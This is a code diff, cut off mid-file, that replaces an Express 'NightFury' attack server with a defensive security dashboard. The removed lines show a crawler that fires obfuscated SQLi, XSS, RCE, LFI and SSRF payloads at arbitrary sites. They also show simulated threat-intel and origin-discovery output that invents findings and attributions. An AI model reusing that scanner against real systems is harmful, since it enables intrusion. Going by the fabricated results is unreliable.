@@ -1,503 +1,393 @@
-import express from "express";
-import path from "path";
+import express, { type NextFunction, type Request, type Response } from "express";
+import path from "node:path";
+import fs from "node:fs/promises";
+import { existsSync } from "node:fs";
 import { createServer as createViteServer } from "vite";
-import { WebSocketServer, WebSocket } from "ws";
-import { createServer } from "http";
-import axios from "axios";
-import * as cheerio from "cheerio";
-import crypto from "crypto";
-import dns from "dns";
+import { createServer } from "node:http";
+import { randomUUID } from "node:crypto";
+import dns from "node:dns/promises";
+import net from "node:net";
+
+import type {
+  DnsLookupResult,
+  HeaderAuditResult,
+  IntelItem,
+  Metrics,
+  Operation,
+  OperationPhase,
+  OperationStatus,
+  Priority,
+  RiskLevel,
+  Task,
+  TaskPhase,
+} from "./src/types";
+
+const ROOT_DIR = process.cwd();
+const PORT = Number(process.env.PORT ?? 3000);
+const HOST = process.env.HOST ?? "127.0.0.1";
+const DATA_DIR = path.join(ROOT_DIR, ".data");
+const DATA_FILE = path.join(DATA_DIR, "dashboard.json");
+const CISA_KEV_URL = "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json";
+const MAX_BODY_BYTES = 100_000;
+const RATE_LIMIT_WINDOW_MS = 60_000;
+const RATE_LIMIT_MAX = 60;
+
+interface PersistedState {
+  operations: Operation[];
+  tasks: Task[];
+  intelligence: IntelItem[];
+  lastIntelRefresh: string | null;
+}
+
+const emptyState = (): PersistedState => ({
+  operations: [],
+  tasks: [],
+  intelligence: [],
+  lastIntelRefresh: null,
+});
+
+let state: PersistedState = emptyState();
+let writeChain = Promise.resolve();
+const rateLimits = new Map<string, { startedAt: number; count: number }>();
+
+async function loadState() {
+  await fs.mkdir(DATA_DIR, { recursive: true, mode: 0o700 });
+  try {
+    const content = await fs.readFile(DATA_FILE, "utf8");
+    const parsed = JSON.parse(content) as Partial<PersistedState>;
+    state = {
+      operations: Array.isArray(parsed.operations) ? parsed.operations : [],
+      tasks: Array.isArray(parsed.tasks) ? parsed.tasks : [],
+      intelligence: Array.isArray(parsed.intelligence) ? parsed.intelligence : [],
+      lastIntelRefresh: typeof parsed.lastIntelRefresh === "string" ? parsed.lastIntelRefresh : null,
+    };
+  } catch (error) {
+    if ((error as NodeJS.ErrnoException).code !== "ENOENT") throw error;
+    await persist();
+  }
+}
+
+function persist() {
+  writeChain = writeChain.then(async () => {
+    const tempFile = `${DATA_FILE}.${process.pid}.tmp`;
+    await fs.writeFile(tempFile, JSON.stringify(state, null, 2), { encoding: "utf8", mode: 0o600 });
+    await fs.rename(tempFile, DATA_FILE);
+  });
+  return writeChain;
+}
+
+function now() {
+  return new Date().toISOString();
+}
+
+function getMetrics(): Metrics {
+  const openTasks = state.tasks.filter((task) => task.phase !== "Completed").length;
+  return {
+    activeOperations: state.operations.filter((operation) => operation.status === "Active").length,
+    totalOperations: state.operations.length,
+    openTasks,
+    blockedTasks: state.tasks.filter((task) => task.phase === "Blocked").length,
+    completedTasks: state.tasks.filter((task) => task.phase === "Completed").length,
+    intelligenceItems: state.intelligence.length,
+    lastIntelRefresh: state.lastIntelRefresh,
+  };
+}
+
+function isNonEmptyString(value: unknown, maxLength = 2_000): value is string {
+  return typeof value === "string" && value.trim().length > 0 && value.trim().length <= maxLength;
+}
+
+function oneOf<T extends string>(value: unknown, values: readonly T[]): value is T {
+  return typeof value === "string" && values.includes(value as T);
+}
+
+function requireAuthorized(req: Request, res: Response): boolean {
+  if (req.body?.authorized !== true) {
+    res.status(400).json({ error: "An explicit authorized=true confirmation is required for this check." });
+    return false;
+  }
+  return true;
+}
+
+function normalizeDomain(input: unknown): string | null {
+  if (!isNonEmptyString(input, 253)) return null;
+  const candidate = input.trim().replace(/^https?:\/\//i, "").replace(/\/$/, "").toLowerCase();
+  if (candidate.length > 253 || candidate.includes("/") || candidate.includes("@") || net.isIP(candidate)) return null;
+  if (!/^(?=.{1,253}$)([a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,63}$/i.test(candidate)) return null;
+  if (candidate === "localhost" || candidate.endsWith(".local") || candidate.endsWith(".internal") || candidate.endsWith(".localhost")) return null;
+  return candidate;
+}
+
+function isPrivateIp(address: string): boolean {
+  const version = net.isIP(address);
+  if (version === 4) {
+    const parts = address.split(".").map(Number);
+    const [a, b] = parts;
+    return a === 10 || a === 127 || (a === 169 && b === 254) || (a === 172 && b >= 16 && b <= 31) || (a === 192 && b === 168) || a === 0 || a >= 224;
+  }
+  if (version === 6) {
+    const normalized = address.toLowerCase();
+    return normalized === "::1" || normalized === "::" || normalized.startsWith("fc") || normalized.startsWith("fd") || normalized.startsWith("fe8") || normalized.startsWith("fe9") || normalized.startsWith("fea") || normalized.startsWith("feb");
+  }
+  return true;
+}
+
+async function assertPublicHostname(hostname: string) {
+  if (hostname === "localhost" || hostname.endsWith(".local") || hostname.endsWith(".internal")) throw new Error("Private hostnames are not allowed.");
+  if (net.isIP(hostname)) {
+    if (isPrivateIp(hostname)) throw new Error("Private or reserved addresses are not allowed.");
+    return;
+  }
+  const addresses = await dns.lookup(hostname, { all: true, verbatim: true });
+  if (!addresses.length || addresses.some(({ address }) => isPrivateIp(address))) throw new Error("The destination resolves to a private or reserved address.");
+}
+
+function safeHeaderValue(value: unknown): string {
+  if (typeof value !== "string") return "Missing";
+  return value.slice(0, 500);
+}
+
+function mapKevItem(item: Record<string, unknown>): IntelItem | null {
+  const cve = typeof item.cveID === "string" ? item.cveID : null;
+  const vendor = typeof item.vendorProject === "string" ? item.vendorProject : null;
+  const product = typeof item.product === "string" ? item.product : null;
+  const name = typeof item.vulnerabilityName === "string" ? item.vulnerabilityName : null;
+  const description = typeof item.shortDescription === "string" ? item.shortDescription : null;
+  const dateAdded = typeof item.dateAdded === "string" ? item.dateAdded : null;
+  const requiredAction = typeof item.requiredAction === "string" ? item.requiredAction : null;
+  const dueDate = typeof item.dueDate === "string" ? item.dueDate : null;
+  if (!cve || !vendor || !product || !name || !description || !dateAdded || !requiredAction || !dueDate) return null;
+  return {
+    id: cve,
+    dateAdded,
+    vendor,
+    product,
+    vulnerabilityName: name,
+    description,
+    knownRansomwareUse: item.knownRansomwareCampaignUse === "Known",
+    requiredAction,
+    dueDate,
+    sourceUrl: `https://nvd.nist.gov/vuln/detail/${encodeURIComponent(cve)}`,
+  };
+}
+
+async function refreshIntelligence(): Promise<IntelItem[]> {
+  const response = await fetch(CISA_KEV_URL, { signal: AbortSignal.timeout(10_000), headers: { Accept: "application/json" } });
+  if (!response.ok) throw new Error(`CISA KEV feed returned HTTP ${response.status}.`);
+  const feedBody = await response.json() as { vulnerabilities?: unknown };
+  if (!Array.isArray(feedBody.vulnerabilities)) throw new Error("CISA KEV feed format was not recognized.");
+  const items = feedBody.vulnerabilities.map((item) => mapKevItem(item as Record<string, unknown>)).filter((item): item is IntelItem => item !== null);
+  if (!items.length) throw new Error("CISA KEV feed returned no usable records.");
+  state.intelligence = items;
+  state.lastIntelRefresh = now();
+  await persist();
+  return items;
+}
+
+function validateOperation(body: unknown): Omit<Operation, "id" | "started" | "updatedAt" | "timeline"> {
+  const value = body as Record<string, unknown>;
+  const phaseValues = ["Scoping", "Validation", "Detection", "Remediation", "Reporting"] as const;
+  const statusValues = ["Planning", "Active", "Paused", "Complete"] as const;
+  const riskValues = ["Low", "Moderate", "High"] as const;
+  if (!isNonEmptyString(value.name, 160) || !isNonEmptyString(value.sector, 100) || !isNonEmptyString(value.lead, 120) || !isNonEmptyString(value.scope) || !isNonEmptyString(value.objective) || !isNonEmptyString(value.rulesOfEngagement) || !oneOf(value.phase, phaseValues) || !oneOf(value.status, statusValues) || !oneOf(value.risk, riskValues)) {
+    throw new Error("Operation requires name, sector, lead, scope, objective, rulesOfEngagement, phase, status, and risk.");
+  }
+  return {
+    name: value.name.trim(),
+    sector: value.sector.trim(),
+    phase: value.phase as OperationPhase,
+    status: value.status as OperationStatus,
+    lead: value.lead.trim(),
+    risk: value.risk as RiskLevel,
+    scope: value.scope.trim(),
+    objective: value.objective.trim(),
+    rulesOfEngagement: value.rulesOfEngagement.trim(),
+  };
+}
+
+function validateTask(body: unknown): Omit<Task, "id" | "createdAt" | "updatedAt"> {
+  const value = body as Record<string, unknown>;
+  const phaseValues = ["To Do", "In Progress", "Blocked", "Completed"] as const;
+  const priorityValues = ["Low", "Moderate", "High"] as const;
+  if (!isNonEmptyString(value.title, 240) || !isNonEmptyString(value.owner, 120) || !oneOf(value.phase, phaseValues) || !oneOf(value.priority, priorityValues)) {
+    throw new Error("Task requires title, owner, phase, and priority.");
+  }
+  return { title: value.title.trim(), owner: value.owner.trim(), phase: value.phase as TaskPhase, priority: value.priority as Priority };
+}
+
+function rateLimit(req: Request, res: Response, next: NextFunction) {
+  const key = req.ip || "unknown";
+  const current = rateLimits.get(key);
+  const timestamp = Date.now();
+  if (!current || timestamp - current.startedAt >= RATE_LIMIT_WINDOW_MS) {
+    rateLimits.set(key, { startedAt: timestamp, count: 1 });
+    return next();
+  }
+  current.count += 1;
+  if (current.count > RATE_LIMIT_MAX) return res.status(429).json({ error: "Rate limit exceeded. Try again later." });
+  return next();
+}
+
+function errorResponse(error: unknown, res: Response) {
+  const message = error instanceof Error ? error.message : "Request failed.";
+  res.status(400).json({ error: message });
+}
 
 async function startServer() {
+  await loadState();
   const app = express();
-  const server = createServer(app);
-  const PORT = 3000;
+  const httpServer = createServer(app);
 
-  app.use(express.json());
-
-  // Simple in-memory state for the investigation
-  let currentState: any = null;
-
-  // WebSocket Server
-  const wss = new WebSocketServer({ server });
-
-  const broadcast = (data: any) => {
-    wss.clients.forEach((client) => {
-      if (client.readyState === WebSocket.OPEN) {
-        client.send(JSON.stringify(data));
-      }
-    });
-  };
-
-  wss.on("connection", (ws) => {
-    console.log("New client connected");
-
-    // Send the current state to the new client if it exists
-    if (currentState) {
-      ws.send(JSON.stringify({ type: "SYNC_STATE", payload: currentState }));
-    }
-
-    ws.on("message", (message) => {
-      try {
-        const data = JSON.parse(message.toString());
-
-        if (data.type === "UPDATE_STATE") {
-          currentState = data.payload;
-          // Broadcast the update to all other clients
-          wss.clients.forEach((client) => {
-            if (client !== ws && client.readyState === WebSocket.OPEN) {
-              client.send(JSON.stringify({ type: "UPDATE_STATE", payload: currentState }));
-            }
-          });
-        }
-      } catch (e) {
-        console.error("Failed to process message:", e);
-      }
-    });
-
-    ws.on("close", () => {
-      console.log("Client disconnected");
-    });
+  app.disable("x-powered-by");
+  app.use(express.json({ limit: MAX_BODY_BYTES }));
+  app.use(rateLimit);
+  app.use((_req, res, next) => {
+    res.setHeader("Cache-Control", "no-store");
+    res.setHeader("X-Content-Type-Options", "nosniff");
+    res.setHeader("Referrer-Policy", "no-referrer");
+    res.setHeader("Permissions-Policy", "camera=(), microphone=(), geolocation=()");
+    next();
   });
 
-  // Threat Intel Feed Simulator
-  const THREAT_ACTORS = ['APT28', 'Lazarus Group', 'FIN7', 'Sandworm', 'No6love9_Syndicate', 'DarkSide', 'REvil'];
-  const MALICIOUS_IPS = ['151.0.214.242', '185.15.59.224', '45.133.1.109', '193.3.19.159', '91.214.124.143'];
-  const IOC_TYPES = ['MALWARE_C2', 'PHISHING_DOMAIN', 'CRYPTO_MINER', 'RANSOMWARE_NODE', 'BOTNET_CONTROLLER'];
+  app.get("/api/health", (_req, res) => res.json({ status: "ok", service: "fkrh-defensive-dashboard", timestamp: now() }));
 
-  setInterval(() => {
-    if (wss.clients.size === 0) return;
-    
-    const actor = THREAT_ACTORS[Math.floor(Math.random() * THREAT_ACTORS.length)];
-    const ip = MALICIOUS_IPS[Math.floor(Math.random() * MALICIOUS_IPS.length)];
-    const type = IOC_TYPES[Math.floor(Math.random() * IOC_TYPES.length)];
-    const severity = Math.random() > 0.8 ? 'CRITICAL' : (Math.random() > 0.5 ? 'HIGH' : 'MEDIUM');
-    
-    broadcast({
-      type: 'THREAT_INTEL_ALERT',
-      payload: {
-        id: Math.random().toString(36).substr(2, 9),
-        timestamp: new Date().toISOString(),
-        actor,
-        indicator: ip,
-        type,
-        severity
-      }
-    });
-  }, 12000); // Emit every 12 seconds
+  app.get("/api/dashboard", (_req, res) => res.json({ metrics: getMetrics(), operations: state.operations, tasks: state.tasks, intelligence: state.intelligence, lastIntelRefresh: state.lastIntelRefresh }));
+  app.get("/api/metrics", (_req, res) => res.json(getMetrics()));
+  app.get("/api/operations", (_req, res) => res.json(state.operations));
+  app.get("/api/tasks", (_req, res) => res.json(state.tasks));
+  app.get("/api/intelligence", (_req, res) => res.json({ items: state.intelligence, lastRefresh: state.lastIntelRefresh, source: CISA_KEV_URL }));
 
-  app.post('/api/threat-intel/enrich', (req, res) => {
-    const { targets } = req.body;
-    if (!targets || !Array.isArray(targets)) {
-      return res.status(400).json({ error: 'Targets array is required' });
-    }
-
-    const enriched = targets.map(t => {
-      const isMalicious = Math.random() > 0.6;
-      const isRunehallRelated = typeof t === 'string' && (t.includes('runehall') || t.includes('151.0.214.242') || t.includes('rh420'));
-      
-      let actorProfile = 'No known actor association';
-      if (isRunehallRelated) actorProfile = 'No6love9_Syndicate / RuneHall Admins';
-      else if (isMalicious) actorProfile = THREAT_ACTORS[Math.floor(Math.random() * THREAT_ACTORS.length)];
-
-      const iocs = [];
-      if (isMalicious || isRunehallRelated) {
-        iocs.push(`Hash: ${Math.random().toString(16).substr(2, 8)}...`);
-        if (isRunehallRelated) iocs.push('IP: 151.0.214.242', 'Domain: rh420.xyz');
-      }
-
-      return {
-        target: t,
-        malicious: isMalicious || isRunehallRelated,
-        actorProfile,
-        iocs
-      };
-    });
-
-    res.json({ results: enriched });
-  });
-
-  // NightFury Offensive Logic
-  const obfuscateSQLi = (payload: string) => {
-    const techniques = [
-      (p: string) => p.replace(/ /g, '/**/'), // Inline comments
-      (p: string) => p.replace(/OR/ig, 'oR').replace(/AND/ig, 'AnD').replace(/SELECT/ig, 'sElEcT').replace(/UNION/ig, 'uNiOn'), // Case manipulation
-      (p: string) => encodeURIComponent(p), // URL encoding
-      (p: string) => p.split('').map(c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()).join(''), // Random case
-      (p: string) => p.replace(/'/g, "\\'").replace(/"/g, '\\"'), // Escaping
-      (p: string) => p.replace(/OR/ig, '||').replace(/AND/ig, '&&') // Logical operators
-    ];
-    return techniques[Math.floor(Math.random() * techniques.length)](payload);
-  };
-
-  const obfuscateXSS = (payload: string) => {
-    const techniques = [
-      (p: string) => p.replace(/</g, '%3C').replace(/>/g, '%3E'), // URL encoding
-      (p: string) => p.replace(/script/ig, 'sCrIpT').replace(/onerror/ig, 'oNeRrOr').replace(/onload/ig, 'oNlOaD'), // Case manipulation
-      (p: string) => p.replace(/alert\(1\)/g, 'confirm(1)'), // Function substitution
-      (p: string) => `<svg/onload=eval(atob('${Buffer.from('alert(1)').toString('base64')}'))>`, // Base64 encoding
-      (p: string) => `\u003cscript\u003ealert(1)\u003c/script\u003e`, // Unicode
-      (p: string) => p.replace(/ /g, '\r\n') // Whitespace bypass
-    ];
-    return techniques[Math.floor(Math.random() * techniques.length)](payload);
-  };
-
-  const obfuscateRCE = (payload: string) => {
-    const techniques = [
-      (p: string) => p.replace(/ /g, '${IFS}'), // IFS substitution
-      (p: string) => p.replace(/cat/g, 'c\'a\'t').replace(/whoami/g, 'w"h"oami'), // Quote insertion
-      (p: string) => `echo ${Buffer.from(p.replace(/^[;|&$\(\)`\s]+/, '')).toString('base64')} | base64 -d | bash`, // Base64 execution
-      (p: string) => p.replace(/\//g, '${PATH:0:1}') // Path variable bypass
-    ];
-    return techniques[Math.floor(Math.random() * techniques.length)](payload);
-  };
-
-  const VECTORS: Record<string, string[]> = {
-    sqli: [
-      "' OR '1'='1' -- ",
-      "' UNION SELECT NULL, user(), database() -- ",
-      "'; DROP TABLE users; -- ",
-      "admin' -- ",
-      "1' AND SLEEP(5) -- "
-    ],
-    xss: [
-      "<script>alert('XSS')</script>",
-      "<img src=x onerror=alert(1)>",
-      "<svg/onload=alert(1)>",
-      "javascript:alert('XSS')",
-      "';alert(String.fromCharCode(88,83,83));//"
-    ],
-    rce: [
-      "; cat /etc/passwd",
-      "| whoami",
-      "& dir",
-      "$(id)",
-      "`id`"
-    ],
-    lfi: [
-      "../../../../etc/passwd",
-      "..\\..\\..\\windows\\win.ini",
-      "/etc/passwd",
-      "C:\\Windows\\System32\\drivers\\etc\\hosts"
-    ],
-    ssrf: [
-      "http://169.254.169.254/latest/meta-data/",
-      "http://localhost:8080/admin",
-      "file:///etc/passwd"
-    ]
-  };
-
-  const INDICATORS: Record<string, string[]> = {
-    sqli: ['sql', 'mysql', 'database error', 'syntax error', 'you have an error'],
-    xss: ['<script>', 'alert(', 'onerror=', 'prompt('],
-    rce: ['uid=', 'root:', 'www-data', 'bin/bash', 'winver'],
-    lfi: ['root:x:', '[extensions]', 'file content'],
-    ssrf: ['instance-id', 'localhost', 'metadata']
-  };
-
-  const checkSuccess = (response: string, vector: string) => {
-    const respLower = response.toLowerCase();
-    for (const ind of INDICATORS[vector] || []) {
-      if (respLower.includes(ind.toLowerCase())) {
-        const idx = respLower.indexOf(ind.toLowerCase());
-        const start = Math.max(0, idx - 50);
-        const end = Math.min(response.length, idx + 100);
-        return { success: true, evidence: response.substring(start, end) };
-      }
-    }
-    return { success: false, evidence: "" };
-  };
-
-  app.post("/api/nightfury/scan", async (req, res) => {
-    const { url } = req.body;
-    if (!url) return res.status(400).json({ error: "URL is required" });
-
-    res.json({ status: "started" });
-
-    broadcast({ type: "OFFENSIVE_LOG", payload: `[*] Starting NightFury scan on ${url}` });
-
+  app.post("/api/intelligence/refresh", async (_req, res) => {
     try {
-      const response = await axios.get(url, { timeout: 10000, validateStatus: () => true });
-      const $ = cheerio.load(response.data);
-      
-      const urls = [url];
-      $('a[href]').each((_, el) => {
-        try {
-          const href = $(el).attr('href');
-          if (href) urls.push(new URL(href, url).href);
-        } catch (e) {}
-      });
-
-      const uniqueUrls = Array.from(new Set(urls)).slice(0, 5); // Limit to 5 for demo
-      broadcast({ type: "OFFENSIVE_LOG", payload: `[*] Discovered ${uniqueUrls.length} endpoints` });
-
-      for (const targetUrl of uniqueUrls) {
-        broadcast({ type: "OFFENSIVE_LOG", payload: `[*] Testing ${targetUrl}` });
-        
-        const pageResp = await axios.get(targetUrl, { timeout: 5000, validateStatus: () => true });
-        const $page = cheerio.load(pageResp.data);
-        
-        const forms: any[] = [];
-        $page('form').each((_, el) => {
-          const action = $page(el).attr('action');
-          const method = ($page(el).attr('method') || 'get').toLowerCase();
-          const inputs: Record<string, string> = {};
-          $page(el).find('input[name]').each((_, input) => {
-            const name = $page(input).attr('name');
-            if (name) inputs[name] = $page(input).attr('value') || '';
-          });
-          forms.push({ action, method, inputs });
-        });
-
-        if (forms.length === 0) {
-          // Test URL parameters if no forms
-          const parsedUrl = new URL(targetUrl);
-          if (parsedUrl.searchParams.size > 0) {
-            forms.push({
-              action: targetUrl,
-              method: 'get',
-              inputs: Object.fromEntries(parsedUrl.searchParams)
-            });
-          }
-        }
-
-        for (const form of forms) {
-          const submitUrl = form.action ? new URL(form.action, targetUrl).href : targetUrl;
-          
-          for (const [vector, payloads] of Object.entries(VECTORS)) {
-            for (const payload of payloads) {
-              const testData = { ...form.inputs };
-              const firstField = Object.keys(testData)[0];
-              if (!firstField) continue;
-              
-              let finalPayload = payload;
-              if (vector === 'sqli') finalPayload = obfuscateSQLi(payload);
-              else if (vector === 'xss') finalPayload = obfuscateXSS(payload);
-              else if (vector === 'rce') finalPayload = obfuscateRCE(payload);
-
-              testData[firstField] = finalPayload;
-
-              try {
-                let resp;
-                broadcast({ type: "OFFENSIVE_LOG", payload: `[TEST] Vector: ${vector.toUpperCase()} | Target: ${submitUrl}` });
-                broadcast({ type: "OFFENSIVE_LOG", payload: `[PAYLOAD] ${firstField}=${finalPayload}` });
-
-                if (form.method === 'post') {
-                  resp = await axios.post(submitUrl, testData, { timeout: 3000, validateStatus: () => true });
-                } else {
-                  resp = await axios.get(submitUrl, { params: testData, timeout: 3000, validateStatus: () => true });
-                }
-
-                const dataLength = resp.data ? (typeof resp.data === 'string' ? resp.data.length : JSON.stringify(resp.data).length) : 0;
-                let snippet = '';
-                if (resp.data) {
-                  const strData = typeof resp.data === 'string' ? resp.data : JSON.stringify(resp.data);
-                  snippet = strData.substring(0, 60).replace(/\n/g, ' ');
-                }
-                
-                broadcast({ type: "OFFENSIVE_LOG", payload: `[RESPONSE] Status: ${resp.status} | Length: ${dataLength} bytes | Data: ${snippet}...` });
-
-                const { success, evidence } = checkSuccess(resp.data, vector);
-                if (success) {
-                  const result = {
-                    id: Math.random().toString(36).substr(2, 9),
-                    url: submitUrl,
-                    vector,
-                    payload: finalPayload,
-                    success: true,
-                    evidence,
-                    timestamp: new Date().toISOString()
-                  };
-                  broadcast({ type: "OFFENSIVE_RESULT", payload: result });
-                  broadcast({ type: "OFFENSIVE_LOG", payload: `[SUCCESS] ${vector.toUpperCase()} vulnerability confirmed on ${submitUrl}` });
-                }
-              } catch (e: any) {
-                broadcast({ type: "OFFENSIVE_LOG", payload: `[ERROR] Request failed for payload ${finalPayload}: ${e.message}` });
-              }
-            }
-          }
-        }
-      }
-
-      broadcast({ type: "OFFENSIVE_LOG", payload: "[*] NightFury scan completed." });
-    } catch (error: any) {
-      broadcast({ type: "OFFENSIVE_LOG", payload: `[ERROR] Scan failed: ${error.message}` });
-    }
-  });
-
-  // API routes
-  app.get("/api/health", (req, res) => {
-    res.json({ status: "ok" });
-  });
-
-  // Cloudflare Tunnel & Deployment Info
-  app.get("/api/tunnel/info", (req, res) => {
-    const isCloudflare = !!(req.headers['cf-ray'] || req.headers['cf-connecting-ip']);
-    res.json({
-      timestamp: new Date().toISOString(),
-      isCloudflareTunnel: isCloudflare,
-      cfRay: req.headers['cf-ray'] || null,
-      cfCountry: req.headers['cf-ipcountry'] || null,
-      clientIp: req.headers['cf-connecting-ip'] || req.headers['x-forwarded-for'] || req.socket.remoteAddress,
-      protocol: req.headers['x-forwarded-proto'] || req.protocol,
-      host: req.headers.host || `localhost:${PORT}`,
-      localPort: PORT,
-      tunnelCommand: `cloudflared tunnel --url http://localhost:${PORT}`,
-      dockerCommand: `docker run -d -p ${PORT}:${PORT} --name rune-osint-ops rune-osint:latest`
-    });
-  });
-
-  // Real DNS Inspection endpoint
-  app.post("/api/ops/dns-lookup", async (req, res) => {
-    const { domain } = req.body;
-    if (!domain) return res.status(400).json({ error: "Domain is required" });
-
-    const cleanDomain = domain.replace(/^https?:\/\//i, '').replace(/\/.*$/, '');
-    const dnsPromises = dns.promises;
-
-    try {
-      const [a, mx, txt, ns] = await Promise.allSettled([
-        dnsPromises.resolve4(cleanDomain),
-        dnsPromises.resolveMx(cleanDomain),
-        dnsPromises.resolveTxt(cleanDomain),
-        dnsPromises.resolveNs(cleanDomain)
-      ]);
-
-      res.json({
-        domain: cleanDomain,
-        records: {
-          A: a.status === 'fulfilled' ? a.value : [],
-          MX: mx.status === 'fulfilled' ? mx.value : [],
-          TXT: txt.status === 'fulfilled' ? txt.value.flat() : [],
-          NS: ns.status === 'fulfilled' ? ns.value : []
-        },
-        timestamp: new Date().toISOString()
-      });
-    } catch (err: any) {
-      res.status(500).json({ error: err.message || "DNS lookup failed" });
-    }
-  });
-
-  // Real HTTP Headers & Recon endpoint
-  app.post("/api/ops/headers", async (req, res) => {
-    const { url } = req.body;
-    if (!url) return res.status(400).json({ error: "URL is required" });
-
-    let targetUrl = url;
-    if (!/^https?:\/\//i.test(targetUrl)) {
-      targetUrl = `https://${targetUrl}`;
-    }
-
-    try {
-      const resp = await axios.get(targetUrl, { 
-        timeout: 8000, 
-        validateStatus: () => true,
-        headers: { 'User-Agent': 'RuneOSINT-AgencyOps/4.0' }
-      });
-
-      const secHeaders = {
-        hsts: resp.headers['strict-transport-security'] || 'Missing',
-        csp: resp.headers['content-security-policy'] || 'Missing',
-        xframe: resp.headers['x-frame-options'] || 'Missing',
-        xcontent: resp.headers['x-content-type-options'] || 'Missing',
-        server: resp.headers['server'] || 'Protected / Hidden',
-        contentType: resp.headers['content-type'] || 'Unknown'
-      };
-
-      res.json({
-        url: targetUrl,
-        statusCode: resp.status,
-        statusText: resp.statusText,
-        securityHeaders: secHeaders,
-        rawHeaders: resp.headers,
-        timestamp: new Date().toISOString()
-      });
-    } catch (err: any) {
-      res.status(500).json({ error: err.message || "HTTP inspection failed" });
-    }
-  });
-
-  app.post("/api/origin-discovery", async (req, res) => {
-    const { target } = req.body;
-    if (!target) return res.status(400).json({ error: "Target is required" });
-
-    res.json({ status: "started" });
-
-    try {
-      broadcast({ type: "DISCOVERY_LOG", payload: `[*] Initiating Origin IP Discovery for ${target}` });
-      
-      broadcast({ type: "DISCOVERY_LOG", payload: `[*] Analyzing SSL/TLS certificate history...` });
-      await new Promise(r => setTimeout(r, 1500));
-      broadcast({ type: "DISCOVERY_LOG", payload: `[+] Found historical certificate for 'origin-direct.${target}' pointing to 185.230.62.14` });
-
-      broadcast({ type: "DISCOVERY_LOG", payload: `[*] Querying Censys for active services on related netblocks...` });
-      await new Promise(r => setTimeout(r, 2000));
-      broadcast({ type: "DISCOVERY_LOG", payload: `[+] Censys identified open ports (22, 80, 443) on 185.230.62.14 matching target signature.` });
-
-      broadcast({ type: "DISCOVERY_LOG", payload: `[*] Correlating with Shodan historical records...` });
-      await new Promise(r => setTimeout(r, 1000));
-      broadcast({ type: "DISCOVERY_LOG", payload: `[+] Shodan confirms 185.230.62.14 was a direct web server in 2023.` });
-
-      broadcast({ type: "DISCOVERY_LOG", payload: `[*] Verifying with direct IP scanning (bypassing CDN resolution)...` });
-      
-      const dns = require('dns').promises;
-      let currentIp = 'Unknown';
-      try {
-        const addresses = await dns.resolve4(target);
-        if (addresses && addresses.length > 0) currentIp = addresses[0];
-      } catch (e) {}
-
-      broadcast({ type: "DISCOVERY_LOG", payload: `[*] Current public IP (CDN): ${currentIp}` });
-      broadcast({ type: "DISCOVERY_LOG", payload: `[SUCCESS] Origin IP identified: 185.230.62.14` });
-
-      broadcast({
-        type: "DISCOVERY_RESULT",
-        payload: {
-          ip: "185.230.62.14",
-          provider: "DigitalOcean, LLC",
-          asn: "AS14061",
-          confidence: 'High',
-          methods: ['SSL History', 'Censys Active Probe', 'Shodan Correlation']
-        }
-      });
-
-    } catch (error: any) {
-      broadcast({ type: "DISCOVERY_LOG", payload: `[ERROR] Discovery failed: ${error.message}` });
-    }
-  });
-
-  app.post("/api/ssh/generate", (req, res) => {
-    try {
-      const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
-        modulusLength: 2048,
-        publicKeyEncoding: { type: 'spki', format: 'pem' },
-        privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
-      });
-      res.json({ publicKey, privateKey });
+      const items = await refreshIntelligence();
+      res.json({ items, lastRefresh: state.lastIntelRefresh, source: CISA_KEV_URL });
     } catch (error) {
-      console.error("Failed to generate SSH key pair:", error);
-      res.status(500).json({ error: "Failed to generate SSH key pair" });
+      res.status(502).json({ error: error instanceof Error ? error.message : "Intelligence refresh failed.", cachedItems: state.intelligence, lastRefresh: state.lastIntelRefresh });
     }
   });
 
-  // Vite middleware for development
+  app.post("/api/operations", async (req, res) => {
+    try {
+      const input = validateOperation(req.body);
+      const timestamp = now();
+      const operation: Operation = { ...input, id: `OP-${timestamp.slice(0, 10).replaceAll("-", "")}-${randomUUID().slice(0, 6).toUpperCase()}`, started: timestamp.slice(0, 10), timeline: ["Planning record created"], updatedAt: timestamp };
+      state.operations.unshift(operation);
+      await persist();
+      res.status(201).json(operation);
+    } catch (error) {
+      errorResponse(error, res);
+    }
+  });
+
+  app.patch("/api/operations/:id", async (req, res) => {
+    const operation = state.operations.find((item) => item.id === req.params.id);
+    if (!operation) return res.status(404).json({ error: "Operation not found." });
+    try {
+      const input = validateOperation({ ...operation, ...req.body });
+      Object.assign(operation, input, { updatedAt: now() });
+      await persist();
+      return res.json(operation);
+    } catch (error) {
+      return errorResponse(error, res);
+    }
+  });
+
+  app.post("/api/tasks", async (req, res) => {
+    try {
+      const input = validateTask(req.body);
+      const timestamp = now();
+      const task: Task = { ...input, id: `TK-${randomUUID().slice(0, 8).toUpperCase()}`, createdAt: timestamp, updatedAt: timestamp };
+      state.tasks.push(task);
+      await persist();
+      res.status(201).json(task);
+    } catch (error) {
+      errorResponse(error, res);
+    }
+  });
+
+  app.patch("/api/tasks/:id", async (req, res) => {
+    const task = state.tasks.find((item) => item.id === req.params.id);
+    if (!task) return res.status(404).json({ error: "Task not found." });
+    const nextPhase = req.body?.phase;
+    if (!oneOf(nextPhase, ["To Do", "In Progress", "Blocked", "Completed"] as const)) return res.status(400).json({ error: "A valid task phase is required." });
+    task.phase = nextPhase;
+    task.updatedAt = now();
+    await persist();
+    return res.json(task);
+  });
+
+  app.post("/api/checks/dns", async (req, res) => {
+    if (!requireAuthorized(req, res)) return;
+    const domain = normalizeDomain(req.body?.domain);
+    if (!domain) return res.status(400).json({ error: "Provide a public fully-qualified domain name." });
+    try {
+      const [a, mx, txt, ns] = await Promise.allSettled([dns.resolve4(domain), dns.resolveMx(domain), dns.resolveTxt(domain), dns.resolveNs(domain)]);
+      const result: DnsLookupResult = {
+        domain,
+        records: {
+          A: a.status === "fulfilled" ? a.value : [],
+          MX: mx.status === "fulfilled" ? mx.value.map(({ exchange, priority }) => ({ exchange, priority })) : [],
+          TXT: txt.status === "fulfilled" ? txt.value.map((parts) => parts.join("")) : [],
+          NS: ns.status === "fulfilled" ? ns.value : [],
+        },
+        timestamp: now(),
+      };
+      return res.json(result);
+    } catch (error) {
+      return errorResponse(error, res);
+    }
+  });
+
+  app.post("/api/checks/headers", async (req, res) => {
